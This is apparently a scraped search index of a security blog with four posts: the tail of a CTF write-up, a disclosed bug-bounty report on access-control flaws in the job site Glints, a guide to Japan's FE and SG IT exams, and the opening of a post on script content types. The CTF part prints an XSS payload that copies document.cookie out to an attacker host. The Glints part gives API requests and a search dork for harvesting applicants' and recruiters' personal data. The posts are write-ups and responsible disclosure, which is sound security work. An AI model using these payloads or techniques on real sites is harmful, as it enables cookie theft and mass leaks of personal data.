but the first one is much simpler. It goes like this: ff&lt;style>&lt;!--&lt;/style>&lt;a id=\"-->&lt;base href='/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'>&lt;/base>&lt;!--\">&lt;/a>&lt;style>&amp;lt;k&lt;/style>&lt;style>-->&lt;/style> In HTML, it’s just a style tag + an a tag + two style tags. But in xhtml, the &lt;!-- --&gt; inside the style is also considered a comment, so it becomes: ff&lt;style>&lt;base href='/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'>&lt;/base>&lt;/style> From the desired effect he wants to achieve, it seems that it can be simplified like this: ff&lt;style>&lt;!--&lt;/style>&lt;a id=\"-->&lt;base href='/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'>&lt;/base>&lt;!--\">&lt;/a>&lt;style>-->&lt;/style>","link":"/2023/07/28/en/google-zer0pts-imaginary-ctf-2023-writeup/"},{"title":"Story of critical security flaws I found in Glints","text":"Glints is a job search platform based in Singapore, and they just got a 20M investment last year, they have a team in Taiwan as well. In July 2021, I found Glints bug bounty program so I spent some time on it, and I found 4 vulnerabilities in total in the end. The vulnerabilities I found could have: Stole every applicant’s personal information, including name, phone, birthday, resume, and email Stole every recruiter’s personal information, including name, job title, team name, and email In other words, the attacker can steal all users’ information by exploiting the vulnerabilities. Let’s see what it is. 1. Job application IDOR leads to user information exposureThere are two roles at Glints: employee and employer. For now, anyone can create an employer account, but still need to do the verification when posting new jobs. For sure, there is a portal for the employer to manage jobs and candidates: Here is the API for checking job applications:/api/recruiterats/jobApplications?where=&#123;&quot;JobId&quot;: &quot;55e137a1-f96e-4720-9b08-7eb2749e1557&quot;&#125; Part of API response： &#123; \"candidate\": &#123; \"id\": \"44007523-f7a8-411d-b2c4-57c68a976534\", \"profilePic\": \"6f14ffc62f3f53d8dcb22a4bfc1da6c8.png\", \"firstName\": \"Peter\", \"lastName\": \"劉\", \"email\": \"xof5566@yopmail.com\", \"phone\": \"+886-999999999\", \"resume\": \"bb042b7400c444659fdedf79a9c8daf3.pdf\", \"salaryExpectation\": null, \"currencyCode\": null, \"recentJob\": &#123; \"title\": \"工程師\" &#125;, \"lastSeen\": \"2021-07-22T01:58:14.859Z\", \"country\": \"Taiwan\", \"city\": \"Taipei\" &#125; &#125; In the response, there are applicant’s name, email, phone and resume file name. After seeing the API URL, I did one thing which all pentesters will do: change JobId to another one which belongs to another company, and to my surprise, it works: We can find JobId easily because it’s public, we can find it in the URL like this：https://glints.com/tw/opportunities/jobs/consultant/55e137a1-f96e-4720-9b08-7eb2749e1557 If I were an attacker, I can write a script to fetch all the job ids from Glints, and exploit the vulnerability to get all personal data from all applicants. RemediationGlints fixed the vulnerability by checking JobId and implementing correct access control. 2. RSS feature IDOR leads to user information exposureGlints has a “RSS feed” feature to let users connect to Slack or other services: There are the applicant’s name, email, and resume in the response: Here is the RSS feed url:https://employers.glints.com/api/feed/jobs/&#123;RSS_ID&#125;/approved-candidates?UserId=&#123;companyOwnerId&#125; To forge the URL, we need the correct RSS_ID for the specific job and user id as well. It’s easy to get user id because company information is public, but how about RSS_ID? I found that there is an API for getting jobs from certain companies:https://employers.glints.tw/api/companies/03638b7f-2da0-4b68-9e92-1be9350600ba/jobs?where=&#123;&quot;status&quot;:&quot;open&quot;&#125;&amp;include=jobSalaries,Groups,City,Country I guessed they used a Node.js ORM called Sequelize in back-end because I am familiar with this library and I found that the naming convention for query string is similar to it. Then, I tried to add a few parameters but most of them did not work, except for one important parameter: attributes. This field decides what to return from Sequelize, for example, attributes=id means it returns id field only in the response. So, I put rssId in the attribute field, and it works: By sending this parameter, we can get job id, rss id, and company owner’s id, then we can query RSS feed to get all applicant’s data. RemediationGlints remove this feature entirely because of low usage. 3. User information exposureFor vulnerability #1 and #2, only employer accounts can exploit it. But for this one, anyone can. After registering an account on Glints, you will have a user id and a public profile page, like this:https://glints.com/tw/profile/public/44007523-f7a8-411d-b2c4-57c68a976534 44007523-f7a8-411d-b2c4-57c68a976534 is my user id which is also shown on the URL. There is another API for getting user profile: https://glints.com/api/publicProfiles/44007523-f7a8-411d-b2c4-57c68a976534 Sensitive information has already been filtered, like phone and email. But, one column has been forgotten: resume. Resume field represents file name only, like badf34128adefqcxsq.pdf, and Glints stores all the resumes in the same place, the URL rule is: https://glints-dashboard.s3.ap-southeast-1.amazonaws.com/resume/xxxxx.pdf In other words, by just knowing the file name of the resume, we can download the file directly. If I know someone’s user id, I can get their resume by exploiting the API we just mentioned, and it usually contains personal data like email, phone, even address. Now, how do we find a bunch of user id? We can do it by google hacking! Because all the public profile page has the same URL pattern, google this keyword can help you to find a lot of user profile page and user id: inurl:profile/public site:glints.com. Then, we use these user ids to get their resume. RemediationGlints remove sensitive fields like resume from the response. 4. Recruiter information exposureBy far, we talked about the vulnerabilities of employees only, let’s see a different vulnerability. I scanned the subdomain of glints.com and found an interesting page: https://superpowered.glints.com/ It requires a Google account with a certain suffix, so we can’t log in. But, we can find some clues in JS file! Usually, those files are minified and hard to read, but we can use the search function on Chrome Devtool. For example, I searched for “query”: From the results, you can see a GraphQL query called findRecruiters, the parameters are also available in source code: query &#123; findRecruiters(input:&#123;&#125;) &#123; id, email, role, displayName, fullName, jobTitle, jobStatus team &#123; labels &#125; &#125; &#125; In response, there are the name, job title, team, and email of every single recruiter: RemediationGlints implemented access control, a guest is unable to access this query anymore. SummaryMost of the vulnerabilities I found are about access control. When access control is broken, it’s easy to access others’ data. It’s not a good thing for job platforms like Glints, because there are name, email, phone, even address in a resume. That’s why all 4 vulnerabilities are identified as high-risk issues, worth 1600 SGD bounty in total. Timeline： 2021-07-09 First vulnerability report 2021-07-09 Glints replied and they are checking 2021-07-13 Glints confirmed the vulnerabilities and working on the fix 2021-07-14 Second vulnerability report 2021-07-20 Glints replied and only one vulnerability is fixed, others still fixing 2021-08-18 I sent an email to Glints to check the latest status, no response 2021-08-31 I sent an email again, no response 2021-09-09 again and still no response 2021-09-20 I opened an issue on their bug bounty program repo, no response 2021-10-04 Glints replied to my email and said that they will get back to me tomorrow, but I got no response 2021-10-20 I sent a follow-up email 2021-10-26 I tweeted about the vulnerability without details because it’s still not fixed, then I got a response from a co-founder at Glints 2021-10-27 Glints asked me for payment detail 2021-11-11 I received part of the bounty and sent an email to ask the status of vulnerabilities 2021-11-11 Glints replied and confirmed that all issues are fixed 2021-12-07 I received bounty in full","link":"/2022/02/08/en/how-i-hacked-glints-and-your-resume-en/"},{"title":"Preparation Experience for Japan's FE and SG Exams for Zero-Day Japanese Beginners","text":"Recently, as a beginner in Zero-Day Japanese, I started studying and passed Japan’s Basic Information Technology and Information Security Management exams. In this post, I will share how I prepared and what exam techniques I used. The outline of the article is as follows: Why take these two exams? Introduction to relevant certifications from Japan’s IPA What is covered in the Information Security Management exam? What is covered in the Basic Information Technology exam? How did I prepare for the exams? What was my strategy? How are the exams conducted? Exam experience and scores Why take these two exams?If you want to work in Japan, you will need to apply for a work visa. Engineers will apply under a category called “Technical&#x2F;Humanities Knowledge&#x2F;International Services,” and the detailed qualifications that can be applied for are listed on the website of the Immigration Services Agency of Japan. There is a PDF file called “Regarding the criteria for activities and landing permits“ (if the link is broken, the document may have been moved, but you can Google it with keywords) that lists the qualifications that can be applied for. (By the way, some readers may have heard of the Highly Skilled Professional System. According to my understanding, even if you have a score of 70 for highly skilled professionals, you cannot apply for a visa if you do not meet the conditions below.) One of the conditions is that you must prove that you have the professional ability to perform the job. How do you prove it? Graduation from a university (or higher) in a related field Graduation from a Japanese technical college Ten or more years of work experience (strictly speaking, practical experience, which seems to include the period when you majored in related courses in school) For the first point, I have heard of some cases where people who did not graduate in a related field were still able to obtain a visa. But my situation is different. My highest educational qualification is high school graduation. To supplement, it is said that depending on the size of the company, the data and qualifications that are looked at may be different. Therefore, in theory, whether you can pass or not still depends on the advice of a professional administrative scrivener, and whether you actually pass depends on how the Immigration Bureau judges it. But anyway, our company consulted an administrative scrivener, and the conclusion was that it is unlikely that I can obtain a visa under my conditions. If, like me, you only have a high school diploma and do not have ten years of work experience, what should you do? (Or if you cannot provide proof of ten years of experience, such as if your previous company went bankrupt and did not leave a resignation certificate, or if your labor insurance record can be used but I am not sure) There is a special clause in the terms and conditions: However, if the applicant intends to engage in work that requires technical or knowledge related to information processing, and has passed an examination related to information processing technology specified by the Minister of Justice by public notice or has a qualification related to information processing technology specified by the Minister of Justice by public notice, this shall not apply. According to Google Translate, the gist is that if you want to work in a technical field (like a software engineer), if you have the relevant certifications specified by the Minister of Justice by public notice, it can also prove that you have sufficient professional ability. So what certifications are available? They are listed here: “Ministry of Justice Ordinance to establish the criteria for Article 7, Paragraph 1, Item 2 of the Immigration Control and Refugee Recognition Act regarding the special criteria for the status of residence for technical&#x2F;humanities knowledge&#x2F;international services“ In addition to local certifications in Japan, certifications from countries such as Thailand, the Philippines, and South Korea, and even certifications from Taiwan are valid! There is an organization called ITPEC, which basically means that several countries are working together to take the same exam, and the questions seem to be the English translation version of the Japanese exam. In Taiwan, it is not included in that organization, and according to the list above, these three tests implemented by the Institute for Information Industry are valid: Software Design Professional Network Communication Professional Information Security Management Professional More detailed regulations are available here: “Mutual Recognition: About Taiwan’s Examination System“ And there are a few lines of small print at the bottom: Regarding Taiwan’s examination system, it was transferred from the Taiwan Ministry of Economic Affairs to CSF&#x2F;III at the end of 2012. In conjunction with this, we concluded a Mutual Cooperation Agreement (MCA) on January 21, 2013, which sets out the cooperation between the two countries regarding the examination. As a result, the relaxation measures for obtaining a work visa for Taiwan’s examinations apply only to those who passed the examinations by the end of 2012 approved by the Taiwan Ministry of Economic Affairs. According to a previous discussion on PTT, it seems to mean that only those who took the exam before 2012 are valid. However, according to the result of my company directly asking the Immigration Bureau, those lines do not seem to mean that, so it is still valid if you take the exam now. So, as for whether these exams are still effective in Taiwan, I can only say that I don’t know. Therefore, if someone wants to pursue this path, they can ask through their Japanese friends or administrative scriveners to get a more accurate answer. These certifications, in addition to serving as proof of qualification for applying for a work visa, are also scored in the highly skilled system’s scoring table. One certification is worth 5 points, and up to two certifications can be used, so passing two certifications will give you an additional 10 points. It sounds good, doesn’t it? In summary, there are two benefits to obtaining relevant certifications: You can obtain a Japanese engineer work visa without a university degree or ten years of work experience (in theory, I am still testing this in person). You can earn points in the highly skilled system. So how do you obtain these certifications? There are three ways: Take the exam at a location that cooperates with ITPEC (I have heard of people going to places like the Philippines and Thailand). Take the exam in Taiwan (but it is uncertain whether it is effective, so you need to ask for more information). Take the exam directly in Japan, and the certifications obtained are definitely valid. The first option can be referred to in ITPEC Exam: Be an Engineer in Japan Without a Degree and Getting a Visa as an Engineer in Japan, which provide relevant information. This article mainly discusses the third option, which is to take the exam directly in Japan. Introduction to Japanese IPA CertificationsThe certifications we want to obtain are administered by the Information-technology Promotion Agency, Japan (IPA). The current exam system is clearly explained in the following figure, taken from: https://www.ipa.go.jp/shiken/kubun/list.html Starting from the bottom left, there is an exam called IT passport, which is the easiest and has the highest pass rate, but it is not useful and cannot be used to apply for a work visa or earn points in the highly skilled system. Above that is the Information Security Management Exam, or SG for short, which is the second easiest and has the second highest pass rate. We will discuss this exam later. Next, in the middle row, the Basic Information Technology Engineer Exam, or FE for short, is the third easiest but already has some difficulty. It covers topics such as computer science and programming. Above that is the Applied Information Technology Engineer Exam, or AP, which is even more difficult, and there are various specialized exams that are even more challenging. In summary, for our goal (obtaining Japanese IT certifications), the two most suitable certifications are: SG Information Security Management Exam FE Basic Information Technology Engineer Exam There is little information about these exams in Chinese, so I would like to thank this Zhihu article for introducing this exam system in detail: This may be the most detailed explanation of the Information Technology Engineer Exam (with review websites), which has been very helpful to me. What is covered in the Information Security Management Exam?I personally think that the exam content is similar to the work of colleagues who work on the blue team (defense side) in a company’s cybersecurity department. The official website describes it as follows: In the department that uses information systems, the person who understands the purpose and content of the information security measures necessary for the department’s business and the information security regulations (including the organization’s internal regulations, including the information security policy) appropriately as an information security leader, realizes and maintains and improves the situation where information security is ensured, and utilizes information and information systems safely. Therefore, the exam content will include some technical aspects, such as knowing the basic types of attacks, what DoS, XSS, and SQL injection are, and some basic encryption and decryption, such as understanding symmetric and asymmetric encryption and how to use these cryptographic tools for verification. As for management, some are regulations, and some are measures for cybersecurity management. I happened to have switched to cybersecurity before, and although I mainly focused on technical aspects, some of the things I learned were helpful for this exam, such as knowing what SOC (Security Operation Center) and IR (Incident Response) are. The exam lasts for 120 minutes and consists of 60 multiple-choice questions. There are 48 questions in Section A, which are single-choice questions, and 12 questions in Section B, which are single-choice questions with multiple options (such as eight options to choose from). (The reason for dividing it into Sections A and B is that the two subjects used to be tested separately, but now they are combined into one exam.) The full score is 1000 points, and 600 points are required to pass. The scoring system is not disclosed. After discussing so much about the exam system, you may want to see what the actual questions look like. Below, I will randomly select one or two questions from the official questions for everyone to see. This is a question from subject A, from the autumn of the first year of Reiwa, question 18: Q: What is WPA3? A: Encryption standard for HTTP communicationB: Encryption standard for TCP&#x2F;IP communicationC: Digital certificate standard used in web serversD: Security standard for wireless LAN This is also a question from subject A, from the spring of the 31st year of Heisei, question 11: Q: What is the purpose of using SPF (Sender Policy Framework)? A: Detecting man-in-the-middle attacks on HTTP communication routes.B: Detecting unauthorized connections to PCs on LAN.C: Detecting unauthorized intrusions into internal networks.D: Detecting email sender spoofing. As for subject B, it is more like an application question, because it is difficult to write tables and pictures here. I will briefly describe it. If you want to see the real questions, you can go here: https://www.ipa.go.jp/news/2022/shiken/gmcbt80000007cfs-att/sg_set_sample_qs.pdf For example, the 50th question above will give you a risk assessment table and guidelines, and then blank out several places in the table, asking you how many points should be filled in according to the above data. I think if you have worked in a large company, you may have an advantage in this subject, because large companies usually have more security management regulations, so as the managed party, you will probably know what measures the company has. What is the Fundamental Information Technology Engineer Examination testing?The English name for this exam is the Fundamental Information Technology Engineer Examination (FE), which is a basic knowledge exam for IT engineers. The SG exam combines subjects AB and the scores are calculated together, while the FE exam is different, with the two subjects tested separately. Subject A has 60 multiple-choice questions, and the test time is 90 minutes. Subject B has 20 multiple-choice questions (such as eight choices), and the test time is 100 minutes. The scores for both subjects are calculated separately, with a full score of 1000 points. Both subjects require a score of 600 or more to pass. Some of the questions in subject A may overlap with SG, such as some basic information security concepts or risk concepts, etc. Other parts are mostly about computer fundamentals, such as binary arithmetic, two’s complement, OSI seven-layer, etc., which are all within the scope of the exam. Subject B is more interesting, testing code completion questions. Here is an example question from the official exam questions released in the past, from the autumn of the 28th year of Heisei, question 19: Q: What is the item used as the judgment criterion for page replacement in the LRU algorithm? A: Time of last referenceB: Time of first referenceC: Reference frequency per unit timeD: Cumulative reference count It is difficult to put subject B questions here, so please refer to this link: https://www.ipa.go.jp/news/2022/shiken/gmcbt80000007cfs-att/fe_kamoku_b_set_sample_qs.pdf For example, the second question inside blanks out the famous FizzBuzz code and asks what should be filled in. If you are not familiar with anything related to information security and are unfamiliar with all the terms, then FE may be a suitable exam for engineers. How did I prepare for the exam? What is the strategy?I recommend two great websites that have past SG and FE exam questions for convenient practice: SG https://www.sg-siken.com/ FE https://www.fe-siken.com/ The first thing I did was to take the SG mock exam, then use Google Translate to translate the questions and answer them. I found that I got 38 out of 50 questions correct, with a 76% accuracy rate. Although the score was not very high, it means that my basic knowledge is sufficient to pass the exam. If the exam is in Chinese, I would probably pass. This is a big premise of my exam strategy, assuming that the exam is in Chinese, and you must be able to pass the exam. This means that what you lack is not technical knowledge, but language. So how do you solve the language problem? As I briefly introduced earlier, there are three different types of characters in the exam questions: Japanese hiragana Japanese katakana Kanji My exam strategy is to give up the first one, and guess the meaning of the question based on the last two, and then choose the answer. Japanese katakana is usually used to write loanwords, and for technical exams like SG and FE, they are mostly technical terms. For example, サーバ (server) is written directly in pinyin as “sa ba”. If we are familiar with Japanese katakana and technical terms, then at least we can understand the keywords in the questions. As for kanji, although some of the meanings of kanji are different from Chinese, they are the minority. In most cases (at least for this exam), they are similar to Chinese. For example, the exam questions I posted earlier: Q: What is the item used as the judgment criterion for page replacement in the LRU algorithm? A: Time of last referenceB: Time of first referenceC: Reference frequency per unit timeD: Cumulative reference count If you know what an LRU cache is, you can probably guess that the question is about how LRU decides which elements to replace, and the answer is A, based on the last referenced time. If you can read hiragana, the understanding of the question will become “What is the criterion used for page replacement in the LRU algorithm?” and you will have a better chance of grasping the keywords for answering. So my exam strategy is simple, which is to “try to understand the question and capture the keywords by relying on learning hiragana, based on sufficient basic knowledge and the ability to read Chinese.” I have several advantages: I am confident in taking exams and consider myself good at taking exams (after all, I have passed the entrance exam for National Taiwan University in high school and have confidence in studying and taking exams). My basic knowledge is sufficient, and I have some experience in information security and engineering, and I have not forgotten the principles of computer science. My original idea was to personally verify whether this exam strategy is effective, and then write an article to share my experience after the exam (even if I fail the exam). Next, I will briefly describe my preparation steps and process. At first, I decided to prepare for the SG exam, but later I also registered for the FE exam, which I will explain later. Anyway, my preparation process is the same for both exams. Step 1: Learn HiraganaYes, I don’t even know hiragana. Although I attended two hiragana classes at a cram school about a year ago, I have almost forgotten everything, so I can be considered a beginner. Because we value rapid learning, remember one thing: “Any method that can help you remember is a good method.” Some hiraganas are difficult to remember, so there may be some mnemonics, which may be taught by friends or found online. As long as you can remember them, it is a good method. Just like many English homophonic memory methods when we were young, my wife and I had a quarrel and went to the balcony, saying “I don’t want to see you” anymore, balcony, which is the same pronunciation as “陽台” in Chinese. I used some mobile apps to assist me, and I used 50音起源 - 日語五十音單詞學習. I started learning hiragana on March 15th, and I seriously studied for two or three days. Except for a few that are easy to confuse, I have memorized almost all of them. Then, because the exam strategy is mainly based on hiragana, if you really want to save time, you can skip katakana. But I learned both together, and I think it’s better to learn both together, and some are easier to remember. I spent about five or six days on this step, including hiragana, katakana, contracted sounds, and voiced sounds. I need to think about the voiced sounds that I am not familiar with, and some katakana are still easy to confuse, and I am not very familiar with hiragana later, but it doesn’t matter, I focus on katakana. Step 2: Read BooksMy initial strategy was to learn while writing exam questions, but later I found that this was not systematic and the learning efficiency was not good, so I switched to buying books. I bought 情報処理教科書 出るとこだけ！情報セキュリティマネジメント テキスト＆問題集［科目A］［科目B］2023年版. I saw that it was the best-selling book, so I bought it. I bought the Kindle version, but I don’t have a Kindle, so I opened it with the Kindle app on my Mac. The e-book is all images, so I used the smart lens of my phone to take a picture of the computer screen to translate it and understand the content of the book, which is genius. Then I took notes on the computer. I read all the hiraganas that appeared in the book and re-typed them with Japanese input method on the notes, adding English or Chinese annotations. The notes look like this: ハッカー(hacker) ホワイトハッカー(white hacker) クラッカー(cracker) スクリプトキディ(scripe kiddie) ソーシャルエンジニアリング(social engineering) Typing once with the input method will make it more memorable, and I will not forget it next time I see it. If there are some things that I don’t know the meaning of even if I read them, I will write down what they are doing, like this: 類推攻擊：Use personal information such as ID and name to guess the password. 辭書攻擊：Dictionary attack プルートフォース (brute force)：Guess the password リバースブルートフォース (reverse brute force)：Guess the account with a fixed password パスワードリスト (password list)：Use other service’s account and password to try, be careful not to confuse with dictionary attack レインボー 攻擊 (rainbow) I took notes on every page of the book like this, and there were a lot of hiraganas in the notes, and my accuracy and speed of reading hiragana gradually improved. Then, for some things that I don’t even know what they are, I will record them separately, such as: ウイルス virus アカウント account キャッシュ cache パターン pattern トランザクション transaction I will record them separately, and it will be easier to review later. Reading books took the most time, and it took me almost two weeks to finish reading the book. The main time-consuming part was procrastination and copying hiragana. About 60-70% of the knowledge in the book was what I already knew, and the other 30-40% was related to Japanese regulations or risk management, which required more time to learn. At the end of the book, there is a simulated test, and I remember getting around 68% on it. Step 3: Practice Exam There was a link to practice earlier, and I followed the years to answer the questions. After answering the questions, be sure to read the explanations, and you can use Google Translate to understand them. Below are my scores after the first round: Spring 2016: 80% Fall 2016: 80% Spring 2017: 78% Fall 2017: 82% Spring 2018: 86% Fall 2018: 72% Spring 2019: 82% Fall 2019: 68% At this point, I felt that the learning effect of reading the book had come out. On the one hand, some of the questions appeared in the book, and on the other hand, my ability to grasp keywords and read hiragana became stronger. At this point, you need to start learning some basic Japanese and kanji. Don’t worry, what you need to learn is very basic. You must know which common usage is “negative usage,” otherwise, you will answer incorrectly. As for how to know, it is actually quite easy to collect from the wrong questions in the practice exam. For example, if you answer incorrectly because you don’t know it is negative, just copy it down. Here are some notes I wrote: できない: cannot せず: negative form Many verbs are followed by ず, which seems to be negative なし: none なく: without In short, if you see なし, なく, and せず, it is negative, and the other 80% are positive. But there are exceptions. For example, if the question contains “なければならない,” after checking, I found that it means “must,” and you think it is negative, but it is actually positive. For cases like this, I just let it go. If it really appears, I will just give up the score because it is too long and I can’t remember it. In addition, some kanji cannot be guessed and need to be memorized, such as: 手口: modus operandi 手間: time-consuming 役割: role 見直し: review 調達: procurement 目安: standard 働く人: employee 手当: allowance 取引: transaction 勝手: selfish 取組: effort 取扱: handling 口座: account These are the kanji that will appear in the practice exam. If you don’t understand them, just write them down. At this point, we are almost complete. At this point, you: Have sufficient basic knowledge and have reviewed the book again Can read hiragana well, and can understand the English meaning of hiragana in the question Can understand the basic negative usage of Japanese (the three tricks I mentioned earlier: なし, なく, and せず) Know the meaning of the kanji that will appear in the question After reaching this point, you can practice the practice exam again. I am too lazy to write all of them, so I picked a few years, and the scores are as follows: Spring 2016: 80% &#x3D;&gt; 94% Fall 2016: 80% &#x3D;&gt; 96% Fall 2018: 72% &#x3D;&gt; 98% Fall 2019: 68% &#x3D;&gt; 90% This means that I have reviewed the questions I answered incorrectly before. Exam strategy summary: Prerequisites: Sufficient knowledge of the exam content (at least 60-70% understanding) Confidence in the exam Learning and exam strategies: Learn hiragana and understand the English technical terms translated from hiragana Review hiragana and other knowledge in the book Learn the knowledge that you did not understand before Practice the practice exam to familiarize yourself with the questions Find out the common negative usage of Japanese through the practice exam Find out the meaning of the kanji that will appear in the question through the practice exam The reason why this exam strategy is useful is that this is an IT exam, so hiragana appears frequently in the questions. In addition, kanji is commonly used in Japanese, so even if you don’t understand Japanese, you can guess what the question is about by the kanji. This is a bit like taking the TOEIC exam in the past. The strategy for English listening is to grasp the keywords. If you grasp the keywords, you don’t need to fully understand the question to answer it. How to take the exam? Both the SG and FE exams originally had to be taken in a physical exam room, and they were only held twice a year. Fortunately, these two exams will become on-demand exams starting in April 2023, and if you fail, you can take the exam again one month later. The exam method is a CBT computer exam, and the registration fee is 7,500 yen. As a person who doesn’t know Japanese at all, it is important to be familiar with the exam process and system usage in advance. You can refer to the resources I collected before: It is also a CBT exam, and the interface is similar.https://www.youtube.com/watch?v=dN7z4Y9MO_Mhttps://www.youtube.com/watch?v=xDmhY4Il8yM Official screen, the only difference is that we don’t have a report to printhttps://www.youtube.com/watch?v=SFZI17TMeSU The same system but different exam process, very similarhttps://jpsk.jp/articles/cbtguide.html?p=2 Remember to bring your ID on the day of the exam. If you are already in Japan, you can bring your residence card. For me, I brought my passport. When I went there, I just showed the screen of my phone to the receptionist (they will send a reminder letter the day before), and then they checked my ID. After confirming my identity, they showed me a sheet with my name on it and asked me to check it. After confirming, I read the exam rules and signed it. After signing, you need to put all your belongings in the locker next to you, and then you will receive an L-shaped folder, which contains: The sheet you just signed, with the account and password you will use to log in later Exam operation instructions The sign indicating which seat you will sit in Pen Calculation paper Then go to the exam room and find the corresponding seat, click on the IPA exam with the mouse, enter the account and password on the paper to log in, and then the test will begin. There will be a three-minute short tutorial on how to use it, which is similar to the video I posted above. I think the system is quite intuitive and easy to use. After the exam, you will see your score directly, and there will be no score report printed out. After logging out of the system, you need to return everything you brought in, including the calculation paper, to the examination counter. The staff will thank you for your hard work and congratulate you on finishing the exam (I don’t understand Japanese, so this is just a guess). Exam Experience and ScoresFrom memorizing the Hiragana and Katakana to taking the exam, it took about a month of preparation time. I didn’t count how many hours I spent on it, but some weekdays I only prepared after work, and on weekends or when I took a day off, I spent more time studying. I took the SG exam on the first day and scored 745 points. Originally, I only registered for the SG exam, thinking that I would concentrate my efforts on this subject. However, when I was preparing, I found that the questions in the B subject were a bit long, and there were more Japanese characters, so I was afraid that my exam strategy would fail. Therefore, my strategy at that time was to get more than 80% in the A subject, so even if I failed all 12 questions in the B subject, it wouldn’t matter. But later, when I looked at the FE exam questions, I found that there were many code questions in the B subject of the FE exam. I thought it might be more advantageous for me, so I registered for the FE exam as well. If I failed, I could always retake it in a month. So I basically didn’t study for the FE exam. I wrote 20 questions from the past exams and found it too tiring and troublesome, so I gave up. In fact, during the SG exam, I had enough time, and I finished writing with about 20 minutes left. After checking for 10 minutes, I handed in the paper. As for the FE exam, it was on the second day. I scored 715 points in the A subject and 905 points in the B subject. I didn’t expect my score to be higher than I thought. The time for the A subject was tight, and I had almost no time to check after finishing writing, only about five minutes left. I think as long as you haven’t forgotten everything you learned in the computer introduction course, you have a good chance of passing. In addition, the A subject also includes some cybersecurity topics, which overlap with the SG exam, so the cybersecurity part helped me score some points. It seems that taking both exams together is still somewhat advantageous. On the other hand, the B subject was much easier than I thought. After finishing writing, I had time to check everything again, and I knew that my score wouldn’t be too bad. In conclusion, I think my exam strategy was effective. I was able to guess the meaning of the questions and options by using Hiragana and Kanji, even though I couldn’t understand Japanese Katakana at all. Of course, this doesn’t mean that 100% of the questions can be understood this way, but if 80% of the questions can be understood in this way, and you master 80% of them, you can get 64% of the score and pass the exam smoothly. Our goal is to pass the exam, not to learn Japanese or get a perfect score. However, there is one variable that I am not sure about, which is whether the difficulty of the questions will change. Maybe I was lucky and the questions were easier. Also, I took the exam when the new system had just been launched, and the organizers might still be adjusting the difficulty, so it may become more difficult in the future. Finally, those two exam websites have message boards for everyone to exchange exam experiences, where you can see how people with different backgrounds study and review, and what scores they get in the end: SG https://www.sg-siken.com/bbs/1487.html FE https://www.fe-siken.com/bbs/4784.html In summary, if you want to work as an engineer in Japan in the future but don’t have the qualifications or high scores, and you don’t know Japanese like me, you can try my exam strategy and take the SG or FE exam. I think it’s a good investment. References: Basic Information Technology Engineer Examination in Japan This may be the most detailed article explaining the Information Processing Engineer Examination (with review websites)","link":"/2023/04/14/en/how-to-prepare-japan-fe-and-sg-exam/"},{"title":"How much do you know about script type?","text":"A while ago, I happened to play a lot of topics related to content type, so I decided to wrote an article about it. As usual, it’s not interesting to talk about the answer directly, so let’s start with three questions: Question oneIn the code below, what is the content type for a.js to successfully load the code? (Assume MIME type sniffing is off) For example, text/javascript is one answer, what else? &lt;script src=\"https://example.com/a.js\"> Question twoWhat values ​​can be filled in the “???”? For example, text/javascriptis and module are both correct answer, what else? &lt;script type=\"???\"> &lt;/script> Question threeNow that you have a web page. In order to let browser run script after loaded, what should be the content type in the response? For example, text/html and text/xml are both correct, what else? Let’s take a look at the answer below. Question 1: Acceptable content type for &lt;script&gt;I start thinking about this question because of an XSS challenge made by @ankursundara last year: https://twitter.com/ankursundara/status/1460810934713081862 Part of the code is as follows: @app.post('/upload') def upload(): try: file_storage = request.files['file'] mimetype = file_storage.mimetype.lower() or 'application/octet-stream' if 'script' in mimetype: mimetype = 'application/octet-stream' content = file_storage.read().decode('latin1') # dont DOS please if len(content) &lt; 1024*1024: data = &#123; 'mimetype': mimetype, 'content': content &#125; filename = token_hex(16) store.set(filename, json.dumps(data), ex=300) return redirect(f'/uploads/&#123;filename&#125;', code=302) except: pass return 'Invalid Upload', 400 @app.get('/uploads/&lt;filename>') def get_upload(filename): data = store.get(filename) if data: data = json.loads(data) return data['content'].encode('latin1'), 200, &#123;'Content-Type': data['mimetype']&#125; else: return \"Not Found\", 404 @app.after_request def headers(response): response.headers[\"Content-Security-Policy\"] = \"script-src 'self'; object-src 'none';\" response.headers[\"X-Content-Type-Options\"] = 'nosniff' return response Simply put, you can upload any file, but if the file’s MIME type has script, it will be application/octet-stream. X-Content-Type-Optionsit is set to nosniff, so we can’t abuse MIME type sniffing. The goal is to successfully execute XSS. It is not difficult to see from the above code that an HTML file can be uploaded, but because of script-src &#39;self&#39; CSP, even if HTML can be uploaded, inline script cannot be used. We can only import script this way: &lt;script src=&quot;/uploads/xxx&quot;&gt;. But, if the content type of /uploads/xxx is application/octet-stream, Chrome will throw following error: Refused to execute script from ‘https://uploader.c.hc.lc/uploads/xxx‘ because its MIME type (‘application&#x2F;octet-stream’) is not executable, and strict MIME type checking is enabled. So the goal of this question is very clear, to find a MIME type that does not contain script but can be successfully loaded by the browser. After seeing this challenge, my first idea is to check the source code of Chromium, it’s easier to find the related part by googling the error message:&quot;strict MIME type checking is enabled&quot; site:https://chromium.googlesource.com/ We can find this related file through the search results: https://chromium.googlesource.com/chromium/blink/+/refs/heads/main/Source/core/dom/ScriptLoader.cpp This file is very old and deprecated, but at least we know it’s part of blink, so we can find a similiar file in the latest codebase, what I found is: third_party&#x2F;blink&#x2F;renderer&#x2F;core&#x2F;script&#x2F;script_loader.cc You can find this function: IsValidClassicScriptTypeAndLanguage // &lt;specdef href=\"https://html.spec.whatwg.org/C/#prepare-a-script\"> bool IsValidClassicScriptTypeAndLanguage( const String&amp; type, const String&amp; language, ScriptLoader::LegacyTypeSupport support_legacy_types) &#123; // FIXME: IsLegacySupportedJavaScriptLanguage() is not valid HTML5. It is used // here to maintain backwards compatibility with existing web tests. The // specific violations are: // - Allowing type=javascript. type= should only support MIME types, such as // text/javascript. // - Allowing a different set of languages for language= and type=. language= // supports Javascript 1.1 and 1.4-1.6, but type= does not. if (type.IsNull()) &#123; // &lt;spec step=\"8\">the script element has no type attribute but it has a // language attribute and that attribute's value is the empty string, // or&lt;/spec> // // &lt;spec step=\"8\">the script element has neither a type attribute // nor a language attribute, then&lt;/spec> if (language.IsEmpty()) return true; // &lt;spec step=\"8\">Otherwise, the element has a non-empty language attribute; // let the script block's type string for this script element be the // concatenation of the string \"text/\" followed by the value of the language // 